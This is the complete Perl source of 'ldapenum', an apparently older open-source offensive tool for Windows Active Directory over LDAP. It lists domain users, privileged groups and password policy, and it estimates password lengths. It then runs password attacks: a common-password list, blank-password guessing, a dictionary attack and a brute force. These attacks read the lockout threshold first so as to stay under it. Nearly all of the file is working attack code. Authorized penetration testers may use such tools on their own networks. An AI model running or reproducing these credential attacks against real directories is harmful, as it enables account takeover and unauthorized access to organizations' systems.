#!/usr/bin/perl

use Net::LDAP;
use Getopt::Std;
use Net::Nslookup;

##################
#LDAP Test Server 
##################
#open (filem, "<ldapenum.dat") || print "cant open ldapenum.dat\n";
#while($record = <filem>)
#{
#	#print $record;
#	@rec = split(/=/, $record);
#	#print @rec;
#	chomp($rec[1]);
#	if($rec[0] eq "IP")
#	{
#		$ip = $rec[1];
#	}
#	if($rec[0] eq "USER")
#	{
#		$uname = $rec[1];
#	}
#	if($rec[0] eq "PASSWORD")
#	{
#		$passw = $rec[1];
#	}
#	if($rec[0] eq "DC")
#	{
#		$thedc = $rec[1];
#	}
#	if($rec[0] eq "CN")
#	{
#		$cn = "cn=$rec[1]";
#	}
#
#}
#close(filem);
#$dc = getdc($thedc);

$cn = "cn=Users";
%argsa = {};
$getuserlist = 0;
$getenumeration = 0;
$getgroup = 0;
$getdict = 0;
$geteasy = 0;
$getbrute = 0;
$gotip = 0;
$gotcn = 0;
$gotuname = 0;
$gotpass = 0;
$gotdict = 0;
$gotcn = 0;
$gotdc = 0;
$gotverbose = 0;
$debug = 0;
getopts("XUEGDBPvi:l:u:p:f:d:r:", \%argsa);

if($argsa{U}) 
{
    	$getuserlist = 1;
}

if($argsa{G})
{
	$getgroup = 1;
}

if($argsa{E})
{
	$getenumeration = 1;
}

if($argsa{D})
{
	$getdict = 1;
}

if($argsa{B})
{
	$getbrute = 1;
}

if($argsa{P})
{
	$geteasy = 1;
}

if($argsa{v})
{
	$gotverbose = 1;
}

if($argsa{d})
{
	$gotdc = 1;
	$dc = getdc($argsa{d});
}

if($argsa{i})
{
	$gotip = 1;
	$ip = $argsa{i};
	if(!$gotdc)
	{
		$dc = getdc("blank");
	}
}

if($argsa{l})
{
	$gotcn = 1;
	$cn = $argsa{l};
}

if($argsa{u})
{
	$gotuname = 1;
	$uname = $argsa{u};
}

if($argsa{p})
{
	$gotpass = 1;
	$passw = $argsa{p};
}

if($argsa{f})
{
	$gotdict = 1;
	$dictfile = $argsa{f};
}

if($argsa{X})
{
	$debug = 1;
}
# Usage conditions

if ($gotip==0) 
{
	Usage();
}
elsif ($getuserlist ==0 && $getenumeration==0 && $getgroup==0 && $geteasy==0 && $getbrute==0 & $getdict==0)
{
	Usage();
}

if($debug)
{
	print "\nValues:\n";
	print "argsa{U} = " . $argsa{U} . "\n";
	print "argsa{G} = " . $argsa{G} . "\n";
	print "argsa{E} = " . $argsa{E} . "\n";
	print "argsa{D} = " . $argsa{D} . "\n";
	print "argsa{B} = " . $argsa{B} . "\n";
	print "argsa{P} = " . $argsa{P} . "\n";
	print "argsa{i} = " . $argsa{i} . "\n";
	print "argsa{l} = " . $argsa{l} . "\n";
	print "argsa{u} = " . $argsa{u} . "\n";
	print "argsa{p} = " . $argsa{p} . "\n";
	print "argsa{f} = " . $argsa{f} . "\n";
	print "argsa{d} = " . $argsa{d} . "\n";
	print "getuserlist = $getuserlist\n";
	print "getgroup = $getgroup\n";
	print "getenumeration = $getenumeration\n";
	print "geteasy = $geteasy\n";
	print "getdict = $getdict\n";
	print "getbrute = $getbrute\n";
	print "ip = $ip\n";
	print "cn = $cn\n";
	print "dc = $dc\n";
	print "uname = $uname\n";
	print "passw = $passw\n";
	print "dictfile = $dictfile\n";
	print "gotdc = $gotdc\n";
}



if($debug)
{
	print "Connecting with the following credentials...\n";
	print "\nIP: $ip\n";
	print "UserName: $uname\n";
	print "Password: $passw\n";
	print "DC: $dc\n";
	print "CN: $cn\n";
}
#########################################
my $mesg;

if($getuserlist)		
{
	print "\n";
	if(gotip && gotuser && gotpass)		
	{
		$ldap = Net::LDAP->new($ip);
		if(!defined($ldap))
		{
			print "Unable to connect to LDAP server.\n";
			print "Check the IP address is valid and LDP port is opened\n";
			exit;
		}
		$mesg = ldap_bind($ldap, $uname, $passw, $dc, $cn, $debug);
		$mesg = ldap_search($ldap,"(&(objectclass=user)(!(objectclass=computer)))",$dc , "sub", $debug);
		%userstuff = display_user_group($mesg);
		@usernames = keys(%userstuff);
		$ldap->unbind;
	}
}

if($getgroup)
{
	print "\n";
	if(gotip && gotuser && gotpass)		
	{
		$ldap = Net::LDAP->new($ip);
		if(!defined($ldap))
		{
			print "Unable to connect to LDAP server.\n";
			print "Check the IP address is valid and LDP port is opened\n";
			exit;
		}
		$mesg = ldap_bind($ldap, $uname, $passw, $dc, $cn, $debug);
		search_priv($ldap, $mesg);
		$ldap->unbind;
	}
}

if($getenumeration)
{
	print "\n";
	$is2003 = 0;
	$lth = 0;
	
	$ldap = Net::LDAP->new($ip);
	if(!defined($ldap))
	{
		print "Unable to connect to LDAP server.\n";
		print "Check the IP address is valid and LDP port is opened\n";
		exit;
	}
	
	if(defined $uname)
	{
		$mesg = ldap_bind($ldap, $uname, $passw, $dc, $cn, $debug);
	}	
	else
	{
		$mesg = $ldap->bind;
	}
		
	$mesg = $ldap->search(filter=>"(ObjectClass=*)", base=>"ou=Domain Controllers, $dc",scope  => 'sub');
	if ($mesg->code == 1)
	{	
		print "2003 Domain Controllers require a valid username and password\n";
		print "in order to be enumerated\n";
	}
	$is2003 = display_sys_info($mesg, $is2003);
	$mesg = $ldap->search(filter=>"(ObjectClass=*)", base=>"$dc",scope  => 'base');
	$lth = display_pwd_info($mesg);
	$ldap->unbind;
}

if($geteasy)
{
	
	if($getuserlist && $getenumeration)
	{
		print "\n";
		easy_pwd(%userstuff);
		if(!($is2003)) # Is not wondows 2003
		{
			print "\nWindows 2000 Detected...Running Blank Password Checker\n";
			easy_pwd_blank(%userstuff);	
		}
		else
		{
			print "\nDetected Windows 2003...Skipping blank password checks\n";
		}		
	}
	else
	{
		print "\nThis must be used in combination with the -U and -E Flag.\n";
	}
}

if($getbrute)
{
	if($getenumeration)
	{
		if ($lth == 0)  	#lockout threshold is 0 ==> Ok to bruteforce
		{
			print "\n";
			brute();
		}
		else
		{
			print "\nCan not run BruteForce Attack because\n";
			print "users will be locked after " . $lth ." attempts";
		}
	}
	else
	{
		print "\nThis must be used in combination with the -E Flag.\n";
	}
}

if($getdict)
{
	if($getenumeration && $getuserlist && $gotdict)
	{
		if ($lth == 0)		#lockout threshold is 0 ==> Ok to launch dictionary attack
		{
			dictionary($dictfile, @usernames);
		}
		else
		{
			print "\nCan not run Dictionary Attack because\n";
			print "users will be locked after " . $lth ." attempts";
		}
		
	}
	elsif($getenumeration && !$getuserlist && $gotdict)
	{
		if ($lth == 0)		#lockout threshold is 0 ==> Ok to launch dictionary attack
		{
			@usernames = $uname;
			dictionary($dictfile, @usernames);
		}
		else
		{
			print "\nCan not run Dictionary Attack because\n";
			print "users will be locked after " . $lth ." attempts";
		}
		
	}
	else
	{
		print "\nThis must be used in combination with the -E, and -f Flag.\n";
	}
}

#########################################
sub Usage()
{
	
	print "\nldapenum v0.04\n";
	print "\nUsage:  ldapenum  [switches]\n";
	print "  -U  User List\n";
	print "  -G  group and Member List\n";
	print "  -E  enumerate Domain Controller Information\n";
	print "  -P  Easy Password Cracker (needs -U,-E)\n";
	print "  -D  dictionary Attack (needs -f and -E flags)\n";
	print "             (optional -U Flag will run attack against\n";
	print "              all the discovered usernames on win2000)\n"; 
	print "  -B  bruteForce Attack (Debug Stages)\n\n";
	
	print "  -i  ip address\n";
	print "  -l  location of user (default -l cn=users)\n"; 
	print "  -d  overides dc returned from DNS\n"; 
	print "		(ie -d ldapserver.test)\n";
	print "  -u  specify username to use\n";
	print "  -p  specify password to use\n";
	print "  -f  specify dict file to use\n\n";
	print "  -v  verbose output\n";
	print "  -X  debug output\n";

	
	print "\nCoded by Roni Bachar\n";
	print "& Sol Zehnwirth\n";
	print "& deanx (Password Length Patch)\n";

	print "ldapenum\@users.sourceforge.net\n";
}
########################################
######
###### Secondary Functions
######
########################################
sub dictionary
{
	my($dictfil, @usernames) = @_;
	$filename = $dictfile;
	
	print "\nUsing Dictionary: " . $filename . "\n";
	$num=0;
	foreach $username (@usernames)
	{
		open (filem, "<$filename") || print "cant open passfile.txt\n";
	
		$_="";
	
		while (<filem>) 
	        {
        	        $pass=$_;  
			chomp($pass);
			if($gotverbose)
			{
				print "Trying --> user:". $username ." pass:" . $pass . "\n";
			}
			$ldap = Net::LDAP->new($ip);
			if(!defined($ldap))
			{
				print "Unable to connect to LDAP server.\n";
				print "Check the IP address is valid and LDP port is open\n";
				exit;
			}
			$mesg = ldap_bind($ldap, $username, $pass, $dc, $cn, $debug);
	                if ($mesg->code == 0)
			{
				print "Password Found --> user:". $username ." pass:" . $pass . "\n";
				@list_dict[$num] = "user:". $username ." pass:" . $pass . "\n";
				$num++;
				last;
			}
			$ldap->unbind;
	        }	
		close(filem);
	
	}
	$found=@list_dict;
	print "\n$found Usernames and Passwords found by Dictionary Attack\n";
	print "----------------------------------------------------\n\n";
	print @list_dict;
}

sub brute
{	
	
	print "Username to bruteforce:";
	$username=<STDIN>;
	
chomp ($username);
	print "Number of letters to brutforce (minimum = $mpl): ";
	$numb=<STDIN>;
	
chomp ($numb);
	$maxstring="z";
	for($i=1;$i < $numb; $i++)
	{
		$maxstring = $maxstring."z";
	}
	$y=0;
	for(a..$maxstring)
	{
		@password[$y] = $_;
		$y++;
	}
	
	$num=0;
	foreach $password (@password)
	{
		$ldap = Net::LDAP->new($ip);
		
		if(defined $ldap)								#Still in Debug stage
		{										#Still in Debug stage
			#print "All Good\n";							#Still in Debug stage
		}										#Still in Debug stage
		else										#Still in Debug stage
		{										#Still in Debug stage
			print "------------------------Caught error--------------------------\n";#Still in Debug stage
			print "Trying Again\n";							#Still in Debug stage
			sleep(2);								#Still in Debug stage		
			$ldap = Net::LDAP->new($ip);						#Still in Debug stage
		}										#Still in Debug stage
		if($gotverbose)
		{
			print "Trying $username:$password...(bind)\n";
		}
		$mesg = ldap_bind($ldap, $username, $password, $dc, $cn, $debug);
		
                if ($mesg->code == 0)
		{
			print "Password Found --> user:". $username ." pass: " . $password . "\n";
			@list_brut[$num] = "user:". $username ." pass:" . $pass . "\n";
			$num++;
			last;
		}
		$ldap->unbind;
	}
	$found=@list_brut;
	print "\n$found Usernames and Passwords found by BruteForce Attack\n";
	print "----------------------------------------------------\n\n";
	print @list_brut;
}

sub easy_pwd_blank
{
	my(%userinfo) = @_;
	@usernames = keys(%userinfo);
	$num=0;
	foreach $username (@usernames)
	{
	
		if($gotverbose)
		{
			print "Trying ". $username . ":\n";
		}
		$ldap = Net::LDAP->new($ip);
		if(!defined($ldap))
		{
			print "Unable to connect to LDAP server.\n";
			print "Check the IP address is valid and LDP port is opened\n";
			exit;
		}
		$mesg5 = $ldap->bind("cn=$username,$cn,$dc");
		#print "code = ".$mesg5->code."\n";
		#print "error =".$mesg5->error."\n";
		if ($mesg5->code == 0)
		{
			print "Password Found --> user:". $username ." pass:\n";
			@list_b[$num] = "user:". $username ." pass:\n";
			$num++;
		}
		$ldap->unbind;
	}
	$found=@list_b;
	print "\n$found Usernames and Passwords found by Blank Password Guessing\n";
	print "----------------------------------------------------\n\n";
	print @list_b;
}

sub easy_pwd
{
	my(%userinfo) = @_;
	@usernames = keys(%userinfo);
	$num=0;
	foreach $username (@usernames)
	{
		@password = ($username,"backup", "admin", "administrator", "test", "123456", "pass", "password" ,"12345", "1234", "qwerty", "abc123", "1q2w3e", "1q2w3e4r", "secret","god", "sex", "money", "love", "stud", "now", "incorrect");
		if($lth == 0)
		{
			$numtests = @password;
			#print "$lth -> tests to run: $numtests\n";					
		}
		else
		{
			$numtests = $lth - $userinfo{$username} - 3;
			#print "Username: $username Count: $userinfo{$username} \n";
			#print "tests to run: $numtests\n";
		}
		
		for($i=0;$i < $numtests; $i++)
		{
			$password5 = $password[$i];
			if($gotverbose)
			{
				print "Trying ". $username . ":". $password5 ."\n";
			}
			$ldap = Net::LDAP->new($ip);
			if(!defined($ldap))
			{
				print "Unable to connect to LDAP server.\n";
				print "Check the IP address is valid and LDP port is opened\n";
				exit;
			}
			$mesg5 = ldap_bind($ldap, $username, $password5, $dc, $cn,0);
			if ($mesg5->code == 0)
			{
				print "Password Found --> user:". $username ." pass: " . $password5 . "\n";
				@list_eas[$num] = "user:". $username ." pass:" . $password5 . "\n";
				$num++;
			}
			$ldap->unbind;
		}
	}
	$found=@list_eas;
	print "\n$found Usernames and Passwords found by Easy Password Guessing\n";
	print "----------------------------------------------------\n\n";
	print @list_eas;
}

########################################
#Display pwd info
########################################
sub display_pwd_info
{
	my($mesg) = @_;
	@entries2 = $mesg->entries;
	foreach $entry2 (@entries2) 
	{
		
		$mpl=$entry2->get_value("minPwdLength");
		$lth=$entry2->get_value("lockoutThreshold");
		$pwdprop=$entry2->get_value("pwdProperties");
		$pwdhlen=$entry2->get_value("pwdHistoryLength");
		$minpwdage=$entry2->get_value("minPwdAge");
		$window = $entry2->get_value("lockOutObservationWindow");
		$window = abs($window);
         	$window = int ( $window / 10000000 );
         	$window = int ( $window / 60 );		
		$minpwdage = abs($minpwdage);
         	$minpwdage = int ( $minpwdage / 10000000 );
         	$minpwdage = int ( $minpwdage / 60 );
		$minpwdage = int ( $minpwdage / 1440 );
		$maxpwdage=$entry2->get_value("maxPwdAge");
		
		$maxpwdage = abs($maxpwdage);
         	$maxpwdage = int ( $maxpwdage / 10000000 );
         	$maxpwdage = int ( $maxpwdage / 60 );
		$maxpwdage = int ( $maxpwdage / 1440 );
		
		$lockdur=$entry2->get_value("lockoutDuration");		
		$lockdur = abs($lockdur);
         	$lockdur = int ( $lockdur / 10000000 );
         	$lockdur = int ( $lockdur / 60 );
		
		print "\nPassword Info\n";
		print "-------------\n";
		print "Min Password Length: $mpl\n";
		print "Lockout Threshold: $lth\n";
		print "Lockout Observation Window: $window minutes\n";
		print "Password Properties: $pwdprop\n";
		if ($pwdprop && 0x01)
		{
			print "\t[x] Password Complexity ON\n";
		}
		elsif ($pwdprop && 0x02)
		{
			print "\t[x] DOMAIN_PASSWORD_NO_ANON_CHANGE ON\n";
		}
		elsif ($pwdprop && 0x04)
		{
			print "\t[x] DOMAIN_PASSWORD_NO_CLEAR_CHANGE ON\n";
		}
		elsif ($pwdprop && 0x08)
		{
			print "\t[x] DOMAIN_LOCKOUT_ADMINS ON\n";
		}
		elsif ($pwdprop && 0x16)
		{
			print "\t[x] DOMAIN_PASSWORD_STORE_CLEARTEXT ON\n";
		}
		elsif ($pwdprop && 0x32)
		{
			print "\t[x] DOMAIN_REFUSE_PASSWORD_CHANGE ON\n";
		}
		print "Password History Length: $pwdhlen\n";
		print "Minimum Password Age: $minpwdage days\n";
		print "Max Password Age: $maxpwdage days\n";
		print "Lockout Duration: $lockdur mins \n";
	}
	
return $lth;
}

########################################
#Display System info
########################################

sub display_sys_info
{
	my($mesg, $is2003) = @_;
	
	@entries2 = $mesg->entries;
	foreach $entry2 (@entries2) 
	{
		$name=$entry2->get_value("name");
		$os=$entry2->get_value("operatingSystem");	
		$sp=$entry2->get_value("operatingSystemServicePack");
		$osver=$entry2->get_value("operatingSystemVersion");
		
		if ($os =~ /2003/)	#Detected a 2003 Machine
		{
			$is2003 = 1;
		}		
		#if (defined $name && $os && $sp && $osver)
		if (defined $name && $os)
		{
			print "System Info\n";
			print "-----------\n";
			print "Name: $name\n";
			print "Operating System: $os\n";
			print "Service Pack: $sp\n";
			print "OS Version: $osver\n";
		}
	}
	return $is2003;
}

########################################
#Display priveleged groups
########################################

sub display_priv
{
	my($mesg) = @_;	
	
	@entries2 = $mesg2->entries;
	$cnt=0;
	print $_ ;
	$cnt2 = 32 - length($_);
	for($i=0;$i<$cnt2;$i++)
	{
		print " ";
	}
	foreach $entry2 (@entries2) 
	{
		@member=$entry2->get_value("member");
	
		foreach (@member)
		{
			$cnt++;
			@test = split(/,/);
			@test2 = split(/=/, $test[0]);
			print $test2[1].", ";
			if(($cnt % 2) == 0)
			{
				print "\n\t\t\t\t";
			} 
		} 
		print "\n";
		if(($cnt % 2) != 0)
		{
			print "\n";
		}
		if($cnt == 0)
		{
			print "\n";
		}
	}
}

########################################
#Search for priveleged groups in LDAP
########################################

sub search_priv
{
	my($ldap, $mesg) = @_;
	
	@types = ("administrators", "Domain Admins", "Enterprise Admins", "Schema Admins", "Group Policy Creator Owners", "Backup Operators", "Power Users");
	print "\n\nGroup Name\t\t\t\tUser\n";
	print "---------------------------------------------------\n";
	foreach (@types)
	{
		$mesg2 = ldap_search($ldap,"cn=$_",$dc, "sub", 0);
		display_priv($mesg2);
	}
	print "\n";
}

########################################
#get password length from AD store
########################################

sub get_password_length {
	my $userparam = shift;
	my $elements= ord(substr($userparam, 49,1));
	my $start = 50;
		for($i=0;$i<$elements;$i++)
		{
			my $namelen = ord(substr($userparam, $start,1));
			my $datalen = ord(substr($userparam, $start+1,1));
			my $name = substr($userparam, $start+2,$namelen/2+1);

			$start += (15+$datalen*1.5);
			my $passlen =  ($datalen-4)/4;
			if ($name == 'G$RADIUSCHAP'){
				return $passlen;
			}
		}
	return "N/A";
}

########################################
#Displays Users and their groups
########################################

sub display_user_group
{
	$cnt=0;
	my($mesg) = @_;
	
	%userinfo = ();
	
	@entries = $mesg->entries;
	
	$i=0;
	print "\n\nUser Name \t\t Password Length \t Groups \n";
	print "--------------------------------------------------------------------------\n";
	foreach $entry (@entries) 
	{
		$name=$entry->get_value("sAMAccountName");
		$badpwdc = $entry->get_value("badPwdCount");
		$cnt2 = 25 - length($name);
		print "$name";
		for($i=0;$i<$cnt2;$i++)
		{
			print " ";
		}
		
		$userinfo{$name}=$badpwdc;
		$userparam = $entry->get_value("userParameters");
		$passlen = get_password_length($userparam);
		print "$passlen\t\t\t ";
		@memberof=$entry->get_value("memberOf");
		foreach (@memberof)
		{
			$cnt++;
			@testmem = split(/,/);
			@testmem2 = split(/=/, $testmem[0]);
			print $testmem2[1].",\t";
			if(($cnt % 2) == 0)
			{
				print "\n\t\t\t\t\t\t ";
			}
		} 
		print "\n";
		if(($cnt % 2) != 0)
		{
			print "\n";
		}
		if($cnt == 0)
		{
			print "\n";
		}
		$i++;
	}
	
	return %userinfo;
}



##############################################
#################### Primary Functions ####################
##############################################
########################################
#Search LDAP
########################################

sub ldap_search 
{
	my($ldap, $filter, $dc, $scope, $debug) = @_;
	$mesg = $ldap->search(filter=>"$filter", base=>"$dc",scope  => $scope);
	if($debug)
	{
		print "Search code = ".$mesg->code."\n";
		print "Search error =".$mesg->error."\n";
	}
	
	return $mesg;
}

########################################
#Bind to LDAP
########################################

sub ldap_bind 
{
	my($ldap, $uname, $passw, $dc, $cnorou, $debug) = @_;
	$mesg = $ldap->bind("cn=$uname,$cnorou,$dc", password=>"$passw");
	if($debug)
	{
		print "Bind code = ".$mesg->code."\n";
		#print "Bind error =".$mesg->error."\n";
	}
	return $mesg;
}

########################################
# Break up dc into a string
########################################

sub getdc
{
	my($str)=@_;
	if($gotdc == 0)
	{
		my $hostname  = nslookup(host => $ip, type => "PTR");
		print "Domain Controller: $hostname\n";	
		$str = $hostname;
		$start = 1;
	}
	elsif($gotdc == 1)
	{
		$start = 0;
	}
	@domcont = split(/\./, $str);
	$dc = "";
	for($i=$start; $i<@domcont; $i++)
	{
		if($i == (@domcont-1))
		{
			$dc .= "dc=$domcont[$i]";
		}
		else
		{
			$dc .= "dc=$domcont[$i],";
		}	
		
	}
	return $dc;
}
